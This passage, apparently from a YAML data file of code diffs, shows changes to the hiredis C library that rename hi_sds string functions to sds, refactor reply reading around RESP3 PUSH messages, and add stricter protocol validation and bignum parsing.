    \         return NULL;\n     }\n \n@@ -938,13 +948,11 @@ int redisBufferRead(redisContext\
    \ *c) {\n         return REDIS_ERR;\n \n     nread = c->funcs->read(c, buf, sizeof(buf));\n\
    -    if (nread > 0) {\n-        if (redisReaderFeed(c->reader, buf, nread) !=\
    \ REDIS_OK) {\n-            __redisSetError(c, c->reader->err, c->reader->errstr);\n\
    -            return REDIS_ERR;\n-        } else {\n-        }\n-    } else if\
    \ (nread < 0) {\n+    if (nread < 0) {\n+        return REDIS_ERR;\n+    }\n+\
    \    if (nread > 0 && redisReaderFeed(c->reader, buf, nread) != REDIS_OK) {\n\
    +        __redisSetError(c, c->reader->err, c->reader->errstr);\n         return\
    \ REDIS_ERR;\n     }\n     return REDIS_OK;\n@@ -965,40 +973,29 @@ int redisBufferWrite(redisContext\
    \ *c, int *done) {\n     if (c->err)\n         return REDIS_ERR;\n \n-    if (hi_sdslen(c->obuf)\
    \ > 0) {\n+    if (sdslen(c->obuf) > 0) {\n         ssize_t nwritten = c->funcs->write(c);\n\
    \         if (nwritten < 0) {\n             return REDIS_ERR;\n         } else\
    \ if (nwritten > 0) {\n-            if (nwritten == (ssize_t)hi_sdslen(c->obuf))\
    \ {\n-                hi_sdsfree(c->obuf);\n-                c->obuf = hi_sdsempty();\n\
    +            if (nwritten == (ssize_t)sdslen(c->obuf)) {\n+                sdsfree(c->obuf);\n\
    +                c->obuf = sdsempty();\n                 if (c->obuf == NULL)\n\
    \                     goto oom;\n             } else {\n-                if (hi_sdsrange(c->obuf,nwritten,-1)\
    \ < 0) goto oom;\n+                if (sdsrange(c->obuf,nwritten,-1) < 0) goto\
    \ oom;\n             }\n         }\n     }\n-    if (done != NULL) *done = (hi_sdslen(c->obuf)\
    \ == 0);\n+    if (done != NULL) *done = (sdslen(c->obuf) == 0);\n     return\
    \ REDIS_OK;\n \n oom:\n     __redisSetError(c, REDIS_ERR_OOM, \"Out of memory\"\
    );\n     return REDIS_ERR;\n }\n \n-/* Internal helper function to try and get\
    \ a reply from the reader,\n- * or set an error in the context otherwise. */\n\
    -int redisGetReplyFromReader(redisContext *c, void **reply) {\n-    if (redisReaderGetReply(c->reader,reply)\
    \ == REDIS_ERR) {\n-        __redisSetError(c,c->reader->err,c->reader->errstr);\n\
    -        return REDIS_ERR;\n-    }\n-\n-    return REDIS_OK;\n-}\n-\n /* Internal\
    \ helper that returns 1 if the reply was a RESP3 PUSH\n  * message and we handled\
    \ it with a user-provided callback. */\n static int redisHandledPushReply(redisContext\
    \ *c, void *reply) {\n@@ -1010,12 +1007,34 @@ static int redisHandledPushReply(redisContext\
    \ *c, void *reply) {\n     return 0;\n }\n \n+/* Get a reply from our reader or\
    \ set an error in the context. */\n+int redisGetReplyFromReader(redisContext *c,\
    \ void **reply) {\n+    if (redisReaderGetReply(c->reader, reply) == REDIS_ERR)\
    \ {\n+        __redisSetError(c,c->reader->err,c->reader->errstr);\n+        return\
    \ REDIS_ERR;\n+    }\n+\n+    return REDIS_OK;\n+}\n+\n+/* Internal helper to\
    \ get the next reply from our reader while handling\n+ * any PUSH messages we\
    \ encounter along the way.  This is separate from\n+ * redisGetReplyFromReader\
    \ so as to not change its behavior. */\n+static int redisNextInBandReplyFromReader(redisContext\
    \ *c, void **reply) {\n+    do {\n+        if (redisGetReplyFromReader(c, reply)\
    \ == REDIS_ERR)\n+            return REDIS_ERR;\n+    } while (redisHandledPushReply(c,\
    \ *reply));\n+\n+    return REDIS_OK;\n+}\n+\n int redisGetReply(redisContext\
    \ *c, void **reply) {\n     int wdone = 0;\n     void *aux = NULL;\n \n     /*\
    \ Try to read pending replies */\n-    if (redisGetReplyFromReader(c,&aux) ==\
    \ REDIS_ERR)\n+    if (redisNextInBandReplyFromReader(c,&aux) == REDIS_ERR)\n\
    \         return REDIS_ERR;\n \n     /* For the blocking context, flush output\
    \ buffer and read reply */\n@@ -1031,12 +1050,8 @@ int redisGetReply(redisContext\
    \ *c, void **reply) {\n             if (redisBufferRead(c) == REDIS_ERR)\n   \
    \              return REDIS_ERR;\n \n-            /* We loop here in case the\
    \ user has specified a RESP3\n-             * PUSH handler (e.g. for client tracking).\
    \ */\n-            do {\n-                if (redisGetReplyFromReader(c,&aux)\
    \ == REDIS_ERR)\n-                    return REDIS_ERR;\n-            } while\
    \ (redisHandledPushReply(c, aux));\n+            if (redisNextInBandReplyFromReader(c,&aux)\
    \ == REDIS_ERR)\n+                return REDIS_ERR;\n         } while (aux ==\
    \ NULL);\n     }\n \n@@ -1058,9 +1073,9 @@ int redisGetReply(redisContext *c,\
    \ void **reply) {\n  * the reply (or replies in pub/sub).\n  */\n int __redisAppendCommand(redisContext\
    \ *c, const char *cmd, size_t len) {\n-    hisds newbuf;\n+    sds newbuf;\n \n\
    -    newbuf = hi_sdscatlen(c->obuf,cmd,len);\n+    newbuf = sdscatlen(c->obuf,cmd,len);\n\
    \     if (newbuf == NULL) {\n         __redisSetError(c,REDIS_ERR_OOM,\"Out of\
    \ memory\");\n         return REDIS_ERR;\n@@ -1112,8 +1127,8 @@ int redisAppendCommand(redisContext\
    \ *c, const char *format, ...) {\n }\n \n int redisAppendCommandArgv(redisContext\
    \ *c, int argc, const char **argv, const size_t *argvlen) {\n-    hisds cmd;\n\
    -    int len;\n+    sds cmd;\n+    long long len;\n \n     len = redisFormatSdsCommandArgv(&cmd,argc,argv,argvlen);\n\
    \     if (len == -1) {\n@@ -1122,11 +1137,11 @@ int redisAppendCommandArgv(redisContext\
    \ *c, int argc, const char **argv, const s\n     }\n \n     if (__redisAppendCommand(c,cmd,len)\
    \ != REDIS_OK) {\n-        hi_sdsfree(cmd);\n+        sdsfree(cmd);\n        \
    \ return REDIS_ERR;\n     }\n \n-    hi_sdsfree(cmd);\n+    sdsfree(cmd);\n  \
    \   return REDIS_OK;\n }\n "
  - "--- a/net.c\n+++ b/net.c\n@@ -80,7 +80,7 @@ ssize_t redisNetRead(redisContext\
    \ *c, char *buf, size_t bufcap) {\n }\n \n ssize_t redisNetWrite(redisContext\
    \ *c) {\n-    ssize_t nwritten = send(c->fd, c->obuf, hi_sdslen(c->obuf), 0);\n\
    +    ssize_t nwritten = send(c->fd, c->obuf, sdslen(c->obuf), 0);\n     if (nwritten\
    \ < 0) {\n         if ((errno == EWOULDBLOCK && !(c->flags & REDIS_BLOCK)) ||\
    \ (errno == EINTR)) {\n             /* Try again later */"
  - "--- a/read.c\n+++ b/read.c\n@@ -59,7 +59,7 @@ static void __redisReaderSetError(redisReader\
    \ *r, int type, const char *str) {\n     }\n \n     /* Clear input buffer on errors.\
    \ */\n-    hi_sdsfree(r->buf);\n+    sdsfree(r->buf);\n     r->buf = NULL;\n \
    \    r->pos = r->len = 0;\n \n@@ -123,29 +123,28 @@ static char *readBytes(redisReader\
    \ *r, unsigned int bytes) {\n \n /* Find pointer to \\r\\n. */\n static char *seekNewline(char\
    \ *s, size_t len) {\n-    int pos = 0;\n-    int _len = len-1;\n-\n-    /* Position\
    \ should be < len-1 because the character at \"pos\" should be\n-     * followed\
    \ by a \\n. Note that strchr cannot be used because it doesn't\n-     * allow\
    \ to search a limited length and the buffer that is being searched\n-     * might\
    \ not have a trailing NULL character. */\n-    while (pos < _len) {\n-       \
    \ while(pos < _len && s[pos] != '\\r') pos++;\n-        if (pos==_len) {\n-  \
    \          /* Not found. */\n-            return NULL;\n-        } else {\n- \
    \           if (s[pos+1] == '\\n') {\n-                /* Found. */\n-       \
    \         return s+pos;\n-            } else {\n-                /* Continue searching.\
    \ */\n-                pos++;\n-            }\n+    char *ret;\n+\n+    /* We\
    \ cannot match with fewer than 2 bytes */\n+    if (len < 2)\n+        return\
    \ NULL;\n+\n+    /* Search up to len - 1 characters */\n+    len--;\n+\n+    /*\
    \ Look for the \\r */\n+    while ((ret = memchr(s, '\\r', len)) != NULL) {\n\
    +        if (ret[1] == '\\n') {\n+            /* Found. */\n+            break;\n\
    \         }\n+        /* Continue searching. */\n+        ret++;\n+        len\
    \ -= ret - s;\n+        s = ret;\n     }\n-    return NULL;\n+\n+    return ret;\n\
    \ }\n \n /* Convert a string into a long long. Returns REDIS_OK if the string\
    \ could be\n@@ -274,60 +273,104 @@ static int processLineItem(redisReader *r)\
    \ {\n \n     if ((p = readLine(r,&len)) != NULL) {\n         if (cur->type ==\
    \ REDIS_REPLY_INTEGER) {\n+            long long v;\n+\n+            if (string2ll(p,\
    \ len, &v) == REDIS_ERR) {\n+                __redisReaderSetError(r,REDIS_ERR_PROTOCOL,\n\
    +                        \"Bad integer value\");\n+                return REDIS_ERR;\n\
    +            }\n+\n             if (r->fn && r->fn->createInteger) {\n-      \
    \          long long v;\n-                if (string2ll(p, len, &v) == REDIS_ERR)\
    \ {\n-                    __redisReaderSetError(r,REDIS_ERR_PROTOCOL,\n-     \
    \                       \"Bad integer value\");\n-                    return REDIS_ERR;\n\
    -                }\n                 obj = r->fn->createInteger(cur,v);\n    \
    \         } else {\n                 obj = (void*)REDIS_REPLY_INTEGER;\n     \
    \        }\n         } else if (cur->type == REDIS_REPLY_DOUBLE) {\n-        \
    \    if (r->fn && r->fn->createDouble) {\n-                char buf[326], *eptr;\n\
    -                double d;\n+            char buf[326], *eptr;\n+            double\
    \ d;\n \n-                if ((size_t)len >= sizeof(buf)) {\n+            if ((size_t)len\
    \ >= sizeof(buf)) {\n+                __redisReaderSetError(r,REDIS_ERR_PROTOCOL,\n\
    +                        \"Double value is too large\");\n+                return\
    \ REDIS_ERR;\n+            }\n+\n+            memcpy(buf,p,len);\n+          \
    \  buf[len] = '\\0';\n+\n+            if (len == 3 && strcasecmp(buf,\"inf\")\
    \ == 0) {\n+                d = INFINITY; /* Positive infinite. */\n+        \
    \    } else if (len == 4 && strcasecmp(buf,\"-inf\") == 0) {\n+              \
    \  d = -INFINITY; /* Negative infinite. */\n+            } else {\n+         \
    \       d = strtod((char*)buf,&eptr);\n+                /* RESP3 only allows \"\
    inf\", \"-inf\", and finite values, while\n+                 * strtod() allows\
    \ other variations on infinity, NaN,\n+                 * etc. We explicity handle\
    \ our two allowed infinite cases\n+                 * above, so strtod() should\
    \ only result in finite values. */\n+                if (buf[0] == '\\0' || eptr\
    \ != &buf[len] || !isfinite(d)) {\n                     __redisReaderSetError(r,REDIS_ERR_PROTOCOL,\n\
    -                            \"Double value is too large\");\n+              \
    \              \"Bad double value\");\n                     return REDIS_ERR;\n\
    \                 }\n+            }\n \n-                memcpy(buf,p,len);\n\
    -                buf[len] = '\\0';\n-\n-                if (strcasecmp(buf,\"\
    ,inf\") == 0) {\n-                    d = INFINITY; /* Positive infinite. */\n\
    -                } else if (strcasecmp(buf,\",-inf\") == 0) {\n-             \
    \       d = -INFINITY; /* Negative infinite. */\n-                } else {\n-\
    \                    d = strtod((char*)buf,&eptr);\n-                    if (buf[0]\
    \ == '\\0' || eptr[0] != '\\0' || isnan(d)) {\n-                        __redisReaderSetError(r,REDIS_ERR_PROTOCOL,\n\
    -                                \"Bad double value\");\n-                   \
    \     return REDIS_ERR;\n-                    }\n-                }\n+       \
    \     if (r->fn && r->fn->createDouble) {\n                 obj = r->fn->createDouble(cur,d,buf,len);\n\
    \             } else {\n                 obj = (void*)REDIS_REPLY_DOUBLE;\n  \
    \           }\n         } else if (cur->type == REDIS_REPLY_NIL) {\n+        \
    \    if (len != 0) {\n+                __redisReaderSetError(r,REDIS_ERR_PROTOCOL,\n\
    +                        \"Bad nil value\");\n+                return REDIS_ERR;\n\
    +            }\n+\n             if (r->fn && r->fn->createNil)\n             \
    \    obj = r->fn->createNil(cur);\n             else\n                 obj = (void*)REDIS_REPLY_NIL;\n\
    \         } else if (cur->type == REDIS_REPLY_BOOL) {\n-            int bval =\
    \ p[0] == 't' || p[0] == 'T';\n+            int bval;\n+\n+            if (len\
    \ != 1 || !strchr(\"tTfF\", p[0])) {\n+                __redisReaderSetError(r,REDIS_ERR_PROTOCOL,\n\
    +                        \"Bad bool value\");\n+                return REDIS_ERR;\n\
    +            }\n+\n+            bval = p[0] == 't' || p[0] == 'T';\n         \
    \    if (r->fn && r->fn->createBool)\n                 obj = r->fn->createBool(cur,bval);\n\
    \             else\n                 obj = (void*)REDIS_REPLY_BOOL;\n+       \
    \ } else if (cur->type == REDIS_REPLY_BIGNUM) {\n+            /* Ensure all characters\
    \ are decimal digits (with possible leading\n+             * minus sign). */\n\
    +            for (int i = 0; i < len; i++) {\n+                /* XXX Consider:\
    \ Allow leading '+'? Error on leading '0's? */\n+                if (i == 0 &&\
    \ p[0] == '-') continue;\n+                if (p[i] < '0' || p[i] > '9') {\n+\
    \                    __redisReaderSetError(r,REDIS_ERR_PROTOCOL,\n+          \
    \                  \"Bad bignum value\");\n+                    return REDIS_ERR;\n\
    +                }\n+            }\n+            if (r->fn && r->fn->createString)\n\
    +                obj = r->fn->createString(cur,p,len);\n+            else\n+ \
    \               obj = (void*)REDIS_REPLY_BIGNUM;\n         } else {\n        \
    \     /* Type will be error or status. */\n+            for (int i = 0; i < len;\
    \ i++) {\n+                if (p[i] == '\\r' || p[i] == '\\n') {\n+          \
    \          __redisReaderSetError(r,REDIS_ERR_PROTOCOL,\n+                    \
    \        \"Bad simple string value\");\n+                    return REDIS_ERR;\n\
    +                }\n+            }\n             if (r->fn && r->fn->createString)\n\
    \                 obj = r->fn->createString(cur,p,len);\n             else\n@@\
    \ -453,7 +496,6 @@ static int processAggregateItem(redisReader *r) {\n     long\
    \ long elements;\n     int root = 0, len;\n \n-    /* Set error for nested multi\
    \ bulks with depth > 7 */\n     if (r->ridx == r->tasks - 1) {\n         if (redisReaderGrow(r)\
    \ == REDIS_ERR)\n             return REDIS_ERR;\n@@ -569,6 +611,9 @@ static int\
    \ processItem(redisReader *r) {\n             case '>':\n                 cur->type\
    \ = REDIS_REPLY_PUSH;\n                 break;\n+            case '(':\n+    \
    \            cur->type = REDIS_REPLY_BIGNUM;\n+                break;\n      \
    \       default:\n                 __redisReaderSetErrorProtocolByte(r,*p);\n\
    \                 return REDIS_ERR;\n@@ -587,6 +632,7 @@ static int processItem(redisReader\
    \ *r) {\n     case REDIS_REPLY_DOUBLE:\n     case REDIS_REPLY_NIL:\n     case\
    \ REDIS_REPLY_BOOL:\n+    case REDIS_REPLY_BIGNUM:\n         return processLineItem(r);\n\
    \     case REDIS_REPLY_STRING:\n     case REDIS_REPLY_VERB:\n@@ -609,7 +655,7\
    \ @@ redisReader *redisReaderCreateWithFunctions(redisReplyObjectFunctions *fn)\
    \ {\n     if (r == NULL)\n         return NULL;\n \n-    r->buf = hi_sdsempty();\n\
    +    r->buf = sdsempty();\n     if (r->buf == NULL)\n         goto oom;\n \n@@\
    \ -650,12 +696,12 @@ void redisReaderFree(redisReader *r) {\n         hi_free(r->task);\n\
    \     }\n \n-    hi_sdsfree(r->buf);\n+    sdsfree(r->buf);\n     hi_free(r);\n\
    \ }\n \n int redisReaderFeed(redisReader *r, const char *buf, size_t len) {\n\
    -    hisds newbuf;\n+    sds newbuf;\n \n     /* Return early when this reader\
    \ is in an erroneous state. */\n     if (r->err)\n@@ -664,19 +710,19 @@ int redisReaderFeed(redisReader\
    \ *r, const char *buf, size_t len) {\n     /* Copy the provided buffer. */\n \
    \    if (buf != NULL && len >= 1) {\n         /* Destroy internal buffer when\
    \ it is empty and is quite large. */\n-        if (r->len == 0 && r->maxbuf !=\
    \ 0 && hi_sdsavail(r->buf) > r->maxbuf) {\n-            hi_sdsfree(r->buf);\n\
    -            r->buf = hi_sdsempty();\n+        if (r->len == 0 && r->maxbuf !=\
    \ 0 && sdsavail(r->buf) > r->maxbuf) {\n+            sdsfree(r->buf);\n+     \
    \       r->buf = sdsempty();\n             if (r->buf == 0) goto oom;\n \n   \
    \          r->pos = 0;\n         }\n \n-        newbuf = hi_sdscatlen(r->buf,buf,len);\n\
    +        newbuf = sdscatlen(r->buf,buf,len);\n         if (newbuf == NULL) goto\
    \ oom;\n \n         r->buf = newbuf;\n-        r->len = hi_sdslen(r->buf);\n+\
    \        r->len = sdslen(r->buf);\n     }\n \n     return REDIS_OK;\n@@ -721,9\
    \ +767,9 @@ int redisReaderGetReply(redisReader *r, void **reply) {\n     /* Discard\
    \ part of the buffer when we've consumed at least 1k, to avoid\n      * doing\
    \ unnecessary calls to memmove() in sds.c. */\n     if (r->pos >= 1024) {\n- \
    \       if (hi_sdsrange(r->buf,r->pos,-1) < 0) return REDIS_ERR;\n+        if\
    \ (sdsrange(r->buf,r->pos,-1) < 0) return REDIS_ERR;\n         r->pos = 0;\n-\
    \        r->len = hi_sdslen(r->buf);\n+        r->len = sdslen(r->buf);\n    \
    \ }\n \n     /* Emit a reply when there is one. */"
  - "--- a/sds.c\n+++ b/sds.c\n@@ -40,90 +40,90 @@\n #include \"sds.h\"\n #include\
    \ \"sdsalloc.h\"\n \n-static inline int hi_sdsHdrSize(char type) {\n-    switch(type&HI_SDS_TYPE_MASK)\
    \ {\n-        case HI_SDS_TYPE_5:\n-            return sizeof(struct hisdshdr5);\n\
    -        case HI_SDS_TYPE_8:\n-            return sizeof(struct hisdshdr8);\n\
    -        case HI_SDS_TYPE_16:\n-            return sizeof(struct hisdshdr16);\n\
    -        case HI_SDS_TYPE_32:\n-            return sizeof(struct hisdshdr32);\n\
    -        case HI_SDS_TYPE_64:\n-            return sizeof(struct hisdshdr64);\n\
    +static inline int sdsHdrSize(char type) {\n+    switch(type&SDS_TYPE_MASK) {\n\
    +        case SDS_TYPE_5:\n+            return sizeof(struct sdshdr5);\n+    \
    \    case SDS_TYPE_8:\n+            return sizeof(struct sdshdr8);\n+        case\
    \ SDS_TYPE_16:\n+            return sizeof(struct sdshdr16);\n+        case SDS_TYPE_32:\n\
    +            return sizeof(struct sdshdr32);\n+        case SDS_TYPE_64:\n+  \
    \          return sizeof(struct sdshdr64);\n     }\n     return 0;\n }\n \n-static\
    \ inline char hi_sdsReqType(size_t string_size) {\n+static inline char sdsReqType(size_t\
    \ string_size) {\n     if (string_size < 32)\n-        return HI_SDS_TYPE_5;\n\
    +        return SDS_TYPE_5;\n     if (string_size < 0xff)\n-        return HI_SDS_TYPE_8;\n\
    +        return SDS_TYPE_8;\n     if (string_size < 0xffff)\n-        return HI_SDS_TYPE_16;\n\
    +        return SDS_TYPE_16;\n     if (string_size < 0xffffffff)\n-        return\
    \ HI_SDS_TYPE_32;\n-    return HI_SDS_TYPE_64;\n+        return SDS_TYPE_32;\n\
    +    return SDS_TYPE_64;\n }\n \n-/* Create a new hisds string with the content\
    \ specified by the 'init' pointer\n+/* Create a new sds string with the content\
    \ specified by the 'init' pointer\n  * and 'initlen'.\n  * If NULL is used for\
    \ 'init' the string is initialized with zero bytes.\n  *\n- * The string is always\
    \ null-termined (all the hisds strings are, always) so\n- * even if you create\
    \ an hisds string with:\n+ * The string is always null-terminated (all the sds\
    \ strings are, always) so\n+ * even if you create an sds string with:\n  *\n-\
    \ * mystring = hi_sdsnewlen(\"abc\",3);\n+ * mystring = sdsnewlen(\"abc\",3);\n\
    \  *\n  * You can print the string with printf() as there is an implicit \\0 at\
    \ the\n  * end of the string. However the string is binary safe and can contain\n\
    - * \\0 characters in the middle, as the length is stored in the hisds header.\
    \ */\n-hisds hi_sdsnewlen(const void *init, size_t initlen) {\n+ * \\0 characters\
    \ in the middle, as the length is stored in the sds header. */\n+sds sdsnewlen(const\
    \ void *init, size_t initlen) {\n     void *sh;\n-    hisds s;\n-    char type\
    \ = hi_sdsReqType(initlen);\n+    sds s;\n+    char type = sdsReqType(initlen);\n\
    \     /* Empty strings are usually created in order to append. Use type 8\n  \
    \    * since type 5 is not good at this. */\n-    if (type == HI_SDS_TYPE_5 &&\
    \ initlen == 0) type = HI_SDS_TYPE_8;\n-    int hdrlen = hi_sdsHdrSize(type);\n\
    +    if (type == SDS_TYPE_5 && initlen == 0) type = SDS_TYPE_8;\n+    int hdrlen\
    \ = sdsHdrSize(type);\n     unsigned char *fp; /* flags pointer. */\n \n-    sh\
    \ = hi_s_malloc(hdrlen+initlen+1);\n+    sh = s_malloc(hdrlen+initlen+1);\n  \
    \   if (sh == NULL) return NULL;\n     if (!init)\n         memset(sh, 0, hdrlen+initlen+1);\n\
    \     s = (char*)sh+hdrlen;\n     fp = ((unsigned char*)s)-1;\n     switch(type)\
    \ {\n-        case HI_SDS_TYPE_5: {\n-            *fp = type | (initlen << HI_SDS_TYPE_BITS);\n\
    +        case SDS_TYPE_5: {\n+            *fp = type | (initlen << SDS_TYPE_BITS);\n\
    \             break;\n         }\n-        case HI_SDS_TYPE_8: {\n-          \
    \  HI_SDS_HDR_VAR(8,s);\n+        case SDS_TYPE_8: {\n+            SDS_HDR_VAR(8,s);\n\
    \             sh->len = initlen;\n             sh->alloc = initlen;\n        \
    \     *fp = type;\n             break;\n         }\n-        case HI_SDS_TYPE_16:\
    \ {\n-            HI_SDS_HDR_VAR(16,s);\n+        case SDS_TYPE_16: {\n+     \
    \       SDS_HDR_VAR(16,s);\n             sh->len = initlen;\n             sh->alloc\
    \ = initlen;\n             *fp = type;\n             break;\n         }\n-   \
    \     case HI_SDS_TYPE_32: {\n-            HI_SDS_HDR_VAR(32,s);\n+        case\
    \ SDS_TYPE_32: {\n+            SDS_HDR_VAR(32,s);\n             sh->len = initlen;\n\
    \             sh->alloc = initlen;\n             *fp = type;\n             break;\n\
    \         }\n-        case HI_SDS_TYPE_64: {\n-            HI_SDS_HDR_VAR(64,s);\n\
    +        case SDS_TYPE_64: {\n+            SDS_HDR_VAR(64,s);\n             sh->len\
    \ = initlen;\n             sh->alloc = initlen;\n             *fp = type;\n@@\
    \ -136,213 +136,213 @@ hisds hi_sdsnewlen(const void *init, size_t initlen) {\n\
    \     return s;\n }\n \n-/* Create an empty (zero length) hisds string. Even in\
    \ this case the string\n+/* Create an empty (zero length) sds string. Even in\
    \ this case the string\n  * always has an implicit null term. */\n-hisds hi_sdsempty(void)\
    \ {\n-    return hi_sdsnewlen(\"\",0);\n+sds sdsempty(void) {\n+    return sdsnewlen(\"\
    \",0);\n }\n \n-/* Create a new hisds string starting from a null terminated C\
    \ string. */\n-hisds hi_sdsnew(const char *init) {\n+/* Create a new sds string\
    \ starting from a null terminated C string. */\n+sds sdsnew(const char *init)\
    \ {\n     size_t initlen = (init == NULL) ? 0 : strlen(init);\n-    return hi_sdsnewlen(init,\
    \ initlen);\n+    return sdsnewlen(init, initlen);\n }\n \n-/* Duplicate an hisds\
    \ string. */\n-hisds hi_sdsdup(const hisds s) {\n-    return hi_sdsnewlen(s, hi_sdslen(s));\n\
    +/* Duplicate an sds string. */\n+sds sdsdup(const sds s) {\n+    return sdsnewlen(s,\
    \ sdslen(s));\n }\n \n-/* Free an hisds string. No operation is performed if 's'\
    \ is NULL. */\n-void hi_sdsfree(hisds s) {\n+/* Free an sds string. No operation\
    \ is performed if 's' is NULL. */\n+void sdsfree(sds s) {\n     if (s == NULL)\
    \ return;\n-    hi_s_free((char*)s-hi_sdsHdrSize(s[-1]));\n+    s_free((char*)s-sdsHdrSize(s[-1]));\n\
    \ }\n \n-/* Set the hisds string length to the length as obtained with strlen(),\
    \ so\n+/* Set the sds string length to the length as obtained with strlen(), so\n\
    \  * considering as content only up to the first null term character.\n  *\n-\
    \ * This function is useful when the hisds string is hacked manually in some\n\
    + * This function is useful when the sds string is hacked manually in some\n \
    \ * way, like in the following example:\n  *\n- * s = hi_sdsnew(\"foobar\");\n\
    + * s = sdsnew(\"foobar\");\n  * s[2] = '\\0';\n- * hi_sdsupdatelen(s);\n- * printf(\"\
    %d\\n\", hi_sdslen(s));\n+ * sdsupdatelen(s);\n+ * printf(\"%d\\n\", sdslen(s));\n\
    \  *\n- * The output will be \"2\", but if we comment out the call to hi_sdsupdatelen()\n\
    + * The output will be \"2\", but if we comment out the call to sdsupdatelen()\n\
    \  * the output will be \"6\" as the string was modified but the logical length\n\
    \  * remains 6 bytes. */\n-void hi_sdsupdatelen(hisds s) {\n+void sdsupdatelen(sds\
    \ s) {\n     int reallen = strlen(s);\n-    hi_sdssetlen(s, reallen);\n+    sdssetlen(s,\
    \ reallen);\n }\n \n-/* Modify an hisds string in-place to make it empty (zero\
    \ length).\n+/* Modify an sds string in-place to make it empty (zero length).\n\
    \  * However all the existing buffer is not discarded but set as free space\n\
    \  * so that next append operations will not require allocations up to the\n \
    \ * number of bytes previously available. */\n-void hi_sdsclear(hisds s) {\n-\
    \    hi_sdssetlen(s, 0);\n+void sdsclear(sds s) {\n+    sdssetlen(s, 0);\n   \
    \  s[0] = '\\0';\n }\n \n-/* Enlarge the free space at the end of the hisds string\
    \ so that the caller\n+/* Enlarge the free space at the end of the sds string\
    \ so that the caller\n  * is sure that after calling this function can overwrite\
    \ up to addlen\n  * bytes after the end of the string, plus one more byte for\
    \ nul term.\n  *\n- * Note: this does not change the *length* of the hisds string\
    \ as returned\n- * by hi_sdslen(), but only the free buffer space we have. */\n\
    -hisds hi_sdsMakeRoomFor(hisds s, size_t addlen) {\n+ * Note: this does not change\
    \ the *length* of the sds string as returned\n+ * by sdslen(), but only the free\
    \ buffer space we have. */\n+sds sdsMakeRoomFor(sds s, size_t addlen) {\n    \
    \ void *sh, *newsh;\n-    size_t avail = hi_sdsavail(s);\n+    size_t avail =\
    \ sdsavail(s);\n     size_t len, newlen;\n-    char type, oldtype = s[-1] & HI_SDS_TYPE_MASK;\n\
    +    char type, oldtype = s[-1] & SDS_TYPE_MASK;\n     int hdrlen;\n \n     /*\
    \ Return ASAP if there is enough space left. */\n     if (avail >= addlen) return\
    \ s;\n \n-    len = hi_sdslen(s);\n-    sh = (char*)s-hi_sdsHdrSize(oldtype);\n\
    +    len = sdslen(s);\n+    sh = (char*)s-sdsHdrSize(oldtype);\n     newlen =\
    \ (len+addlen);\n-    if (newlen < HI_SDS_MAX_PREALLOC)\n+    if (newlen < SDS_MAX_PREALLOC)\n\
    \         newlen *= 2;\n     else\n-        newlen += HI_SDS_MAX_PREALLOC;\n+\
    \        newlen += SDS_MAX_PREALLOC;\n \n-    type = hi_sdsReqType(newlen);\n\
    +    type = sdsReqType(newlen);\n \n     /* Don't use type 5: the user is appending\
    \ to the string and type 5 is\n-     * not able to remember empty space, so hi_sdsMakeRoomFor()\
    \ must be called\n+     * not able to remember empty space, so sdsMakeRoomFor()\
    \ must be called\n      * at every appending operation. */\n-    if (type == HI_SDS_TYPE_5)\
    \ type = HI_SDS_TYPE_8;\n+    if (type == SDS_TYPE_5) type = SDS_TYPE_8;\n \n\
    -    hdrlen = hi_sdsHdrSize(type);\n+    hdrlen = sdsHdrSize(type);\n     if (oldtype==type)\
    \ {\n-        newsh = hi_s_realloc(sh, hdrlen+newlen+1);\n+        newsh = s_realloc(sh,\
    \ hdrlen+newlen+1);\n         if (newsh == NULL) return NULL;\n         s = (char*)newsh+hdrlen;\n\
    \     } else {\n         /* Since the header size changes, need to move the string\
    \ forward,\n          * and can't use realloc */\n-        newsh = hi_s_malloc(hdrlen+newlen+1);\n\
    +        newsh = s_malloc(hdrlen+newlen+1);\n         if (newsh == NULL) return\
    \ NULL;\n         memcpy((char*)newsh+hdrlen, s, len+1);\n-        hi_s_free(sh);\n\
    +        s_free(sh);\n         s = (char*)newsh+hdrlen;\n         s[-1] = type;\n\
    -        hi_sdssetlen(s, len);\n+        sdssetlen(s, len);\n     }\n-    hi_sdssetalloc(s,\
    \ newlen);\n+    sdssetalloc(s, newlen);\n     return s;\n }\n \n-/* Reallocate\
    \ the hisds string so that it has no free space at the end. The\n+/* Reallocate\
    \ the sds string so that it has no free space at the end. The\n  * contained string\
    \ remains not altered, but next concatenation operations\n  * will require a reallocation.\n\
    \  *\n- * After the call, the passed hisds string is no longer valid and all the\n\
    + * After the call, the passed sds string is no longer valid and all the\n  *\
    \ references must be substituted with the new pointer returned by the call. */\n\
    -hisds hi_sdsRemoveFreeSpace(hisds s) {\n+sds sdsRemoveFreeSpace(sds s) {\n  \
    \   void *sh, *newsh;\n-    char type, oldtype = s[-1] & HI_SDS_TYPE_MASK;\n+\
    \    char type, oldtype = s[-1] & SDS_TYPE_MASK;\n     int hdrlen;\n-    size_t\
    \ len = hi_sdslen(s);\n-    sh = (char*)s-hi_sdsHdrSize(oldtype);\n+    size_t\
    \ len = sdslen(s);\n+    sh = (char*)s-sdsHdrSize(oldtype);\n \n-    type = hi_sdsReqType(len);\n\
    -    hdrlen = hi_sdsHdrSize(type);\n+    type = sdsReqType(len);\n+    hdrlen\
    \ = sdsHdrSize(type);\n     if (oldtype==type) {\n-        newsh = hi_s_realloc(sh,\
    \ hdrlen+len+1);\n+        newsh = s_realloc(sh, hdrlen+len+1);\n         if (newsh\
    \ == NULL) return NULL;\n         s = (char*)newsh+hdrlen;\n     } else {\n- \
    \       newsh = hi_s_malloc(hdrlen+len+1);\n+        newsh = s_malloc(hdrlen+len+1);\n\
    \         if (newsh == NULL) return NULL;\n         memcpy((char*)newsh+hdrlen,\
    \ s, len+1);\n-        hi_s_free(sh);\n+        s_free(sh);\n         s = (char*)newsh+hdrlen;\n\
    \         s[-1] = type;\n-        hi_sdssetlen(s, len);\n+        sdssetlen(s,\
    \ len);\n     }\n-    hi_sdssetalloc(s, len);\n+    sdssetalloc(s, len);\n   \
    \  return s;\n }\n \n-/* Return the total size of the allocation of the specifed\
    \ hisds string,\n+/* Return the total size of the allocation of the specifed sds\
    \ string,\n  * including:\n- * 1) The hisds header before the pointer.\n+ * 1)\
    \ The sds header before the pointer.\n  * 2) The string.\n  * 3) The free buffer\
    \ at the end if any.\n  * 4) The implicit null term.\n  */\n-size_t hi_sdsAllocSize(hisds\
    \ s) {\n-    size_t alloc = hi_sdsalloc(s);\n-    return hi_sdsHdrSize(s[-1])+alloc+1;\n\
